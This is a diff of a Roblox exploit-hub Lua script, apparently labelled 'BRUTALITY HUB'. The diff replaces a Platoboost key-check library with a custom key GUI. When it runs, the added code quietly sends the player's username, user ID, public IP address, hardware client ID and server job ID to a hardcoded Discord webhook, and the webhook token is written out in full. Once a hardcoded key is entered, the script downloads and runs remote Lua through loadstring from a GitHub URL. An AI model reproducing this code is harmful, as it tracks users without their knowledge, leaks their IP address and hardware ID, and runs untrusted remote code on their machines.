@@ -1,124 +1,209 @@
--- Plato configuration
-local accountId = 44126; -- Plato account id [IMPORTANT]
-local allowPassThrough = false; -- Allow user through if error occurs, may reduce security
-local allowKeyRedeeming = false; -- Automatically check keys to redeem if valid
-local useDataModel = false;
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    local data =
+        request(
+        {
+            Url = Url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(message)
+        }
+    )
+    return ""
+end
 
--- Plato callbacks
-local onMessage = function(message)
-    --logic
-end;
+function AdminLoggerMsg()
+    AdminMessage = {
+        ["embeds"] = {
+            {
+                ["title"] = "**User Universal**",
+                ["description"] ="Loading getkey...",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x006400), --ungu
+                ["fields"] = {
+                    {
+                        ["name"] = "**Username**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**UserID**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**PlaceID**",
+                        ["value"] = "```" .. game.PlaceId .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**IP Address**",
+                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**Hwid**",
+                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**JobID**",
+                        ["value"] = "```" .. game.JobId .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**Join Code**",
+                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
+                        ["inline"] = false
+                    }
+                },
+                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+            }
+        }
+    }
+    return AdminMessage
+end
 
--- Plato internals [START]
-local fRequest, fStringFormat, fSpawn, fWait = request or http.request or http_request or syn.request, string.format, task.spawn, task.wait;
-local localPlayerId = game:GetService("Players").LocalPlayer.UserId;
-local rateLimit, rateLimitCountdown, errorWait = false, 0, false;
--- Plato internals [END]
+PostWebhook("https://discord.com/api/webhooks/1270819604054282455/bJKM_82uyRAg7gzER5kubRzy6s893sG9Q0Smq7zjVqjqc95VMDhGfQTm4oP2mzNxzEpf", AdminLoggerMsg())
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
 
--- Plato global functions [START]
-function getLink()
-    return fStringFormat("https://gateway.platoboost.com/a/%i?id=%i", accountId, localPlayerId);
-end;
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
-function verify(key)
-    if errorWait or rateLimit then 
-        return false;
-    end;
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 200)
+frame.Position = UDim2.new(0.5, -150, -0.5, -100) -- Start position off-screen
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
 
-    onMessage("Checking key...");
+local headerLabel = Instance.new("TextLabel")
+headerLabel.Size = UDim2.new(1, 0, 0, 30)
+headerLabel.Position = UDim2.new(0, 0, 0, 0)
+headerLabel.Text = "BRUTALITY HUB" -- ganti dengan nama script hub kamu
+headerLabel.Font = Enum.Font.SourceSansBold
+headerLabel.TextSize = 18
+headerLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+headerLabel.BackgroundTransparency = 1
+headerLabel.TextWrapped = true
+headerLabel.Parent = frame
 
-    if (useDataModel) then
-        local status, result = pcall(function() 
-            return game:HttpGetAsync(fStringFormat("https://api-gateway.platoboost.com/v1/public/whitelist/%i/%i?key=%s", accountId, localPlayerId, key));
-        end);
-        
-        if status then
-            if string.find(result, "true") then
-                onMessage("Successfully whitelisted!");
-                return true;
-            elseif string.find(result, "false") then
-                if allowKeyRedeeming then
-                    local status1, result1 = pcall(function()
-                        return game:HttpPostAsync(fStringFormat("https://api-gateway.platoboost.com/v1/authenticators/redeem/%i/%i/%s", accountId, localPlayerId, key), {});
-                    end);
+-- Buat tombol close (X)
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -30, 0, 0)
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 18
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.BackgroundTransparency = 1
+closeButton.Parent = frame
 
-                    if status1 then
-                        if string.find(result1, "true") then
-                            onMessage("Successfully redeemed key!");
-                            return true;
-                        end;
-                    end;
-                end;
-                
-                onMessage("Key is invalid!");
-                return false;
-            else
-                return false;
-            end;
-        else
-            onMessage("An error occured while contacting the server!");
-            return allowPassThrough;
-        end;
-    else
-        local status, result = pcall(function() 
-            return fRequest({
-                Url = fStringFormat("https://api-gateway.platoboost.com/v1/public/whitelist/%i/%i?key=%s", accountId, localPlayerId, key),
-                Method = "GET"
-            });
-        end);
+-- Fungsi untuk close UI
+closeButton.MouseButton1Click:Connect(function()
+    local tween = TweenService:Create(frame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -150, -0.5, -100)})
+    tween:Play()
+    tween.Completed:Connect(function()
+        screenGui:Destroy()
+    end)
+end)
 
-        if status then
-            if result.StatusCode == 200 then
-                if string.find(result.Body, "true") then
-                    onMessage("Successfully whitelisted key!");
-                    return true;
-                else
-                    if (allowKeyRedeeming) then
-                        local status1, result1 = pcall(function() 
-                            return fRequest({
-                                Url = fStringFormat("https://api-gateway.platoboost.com/v1/authenticators/redeem/%i/%i/%s", accountId, localPlayerId, key),
-                                Method = "POST"
-                            });
-                        end);
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 0, 50)
+label.Position = UDim2.new(0, 0, 0, 30)
+label.Text = "Join Discord Or Gay!"
+label.Font = Enum.Font.SourceSansBold
+label.TextSize = 24
+label.TextColor3 = Color3.fromRGB(0, 255, 0)
+label.BackgroundTransparency = 1
+label.TextWrapped = true
+label.Parent = frame
 
-                        if status1 then
-                            if result1.StatusCode == 200 then
-                                if string.find(result1.Body, "true") then
-                                    onMessage("Successfully redeemed key!");
-                                    return true;
-                                end;
-                            end;
-                        end;
-                    end;
-                    
-                    return false;
-                end;
-            elseif result.StatusCode == 204 then
-                onMessage("Account wasn't found, check accountId");
-                return false;
-            elseif result.StatusCode == 429 then
-                if not rateLimit then 
-                    rateLimit = true;
-                    rateLimitCountdown = 10;
-                    fSpawn(function() 
-                        while rateLimit do
-                            onMessage(fStringFormat("You are being rate-limited, please slow down. Try again in %i second(s).", rateLimitCountdown));
-                            fWait(1);
-                            rateLimitCountdown = rateLimitCountdown - 1;
-                            if rateLimitCountdown < 0 then
-                                rateLimit = false;
-                                rateLimitCountdown = 0;
-                                onMessage("Rate limit is over, please try again.");
-                            end;
-                        end;
-                    end); 
-                end;
-            else
-                return allowPassThrough;
-            end;    
-        else
-            return allowPassThrough;
-        end;
-    end;
-end;
--- Plato global functions [END]
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(0.8, 0, 0, 30)
+textBox.Position = UDim2.new(0.1, 0, 0.4, 0)
+textBox.Text = "Pray To God"
+textBox.Font = Enum.Font.SourceSans
+textBox.TextSize = 18
+textBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+textBox.TextWrapped = true -- supaya teks tetap di dalam text box
+textBox.Parent = frame
+
+local getKeyButton = Instance.new("TextButton")
+getKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
+getKeyButton.Position = UDim2.new(0.1, 0, 0.7, 0)
+getKeyButton.Text = "Discord"
+getKeyButton.Font = Enum.Font.SourceSansBold
+getKeyButton.TextSize = 15
+getKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+getKeyButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+getKeyButton.Parent = frame
+
+local checkKeyButton = Instance.new("TextButton")
+checkKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
+checkKeyButton.Position = UDim2.new(0.5, 0, 0.7, 0)
+checkKeyButton.Text = "Start"
+checkKeyButton.Font = Enum.Font.SourceSansBold
+checkKeyButton.TextSize = 15
+checkKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+checkKeyButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+checkKeyButton.Parent = frame
+
+-- Label untuk pesan "Link copied!" dan validasi key
+local validationLabel = Instance.new("TextLabel")
+validationLabel.Size = UDim2.new(0.8, 0, 0, 30)
+validationLabel.Position = UDim2.new(0.1, 0, 0.575, 0)
+validationLabel.Text = "Input your key"
+validationLabel.Font = Enum.Font.SourceSansBold
+validationLabel.TextSize = 18
+validationLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+validationLabel.BackgroundTransparency = 1
+validationLabel.Parent = frame
+
+-- Fungsi untuk Get Key
+getKeyButton.MouseButton1Click:Connect(function()
+    -- Mengarahkan ke link untuk mendapatkan key
+    local getKeyLink = "https://bit.ly/3YAeewk" -- ganti dengan link get key kamu
+    setclipboard(getKeyLink)
+    validationLabel.Text = "Link key copied!"
+    validationLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+end)
+
+-- Fungsi untuk Check Key
+checkKeyButton.MouseButton1Click:Connect(function()
+local enteredKey = textBox.Text
+    local currentKey = "hwid.key:24jbd89d73dgqbd7d32fd8sabd2g9q3afv3q7gf2es2ewe" -- ganti ini dengan key yang benar
+    if enteredKey == currentKey then
+        validationLabel.Text = "Checking game..."
+        validationLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            wait(1.7)
+        validationLabel.Text = "Game Is Valid!"
+        validationLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+        wait(2)
+        validationLabel.Text = "Menyala abangkuhhhh"
+        validationLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+        wait(2)
+        local tween = TweenService:Create(frame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -150, 1.5, -100)})
+        tween:Play()
+        tween.Completed:Connect(function()
+            screenGui:Destroy()
+        end)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/y/main/Apatuch.lua"))()
+else
+        validationLabel.Text = "Checking Key..."
+        validationLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            wait(1.7)    
+        validationLabel.Text = "Invalid Key,please get key"
+        validationLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end)
+
+wait(3)
+local tween = TweenService:Create(frame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -150, 0.5, -100)})
+tween:Play()
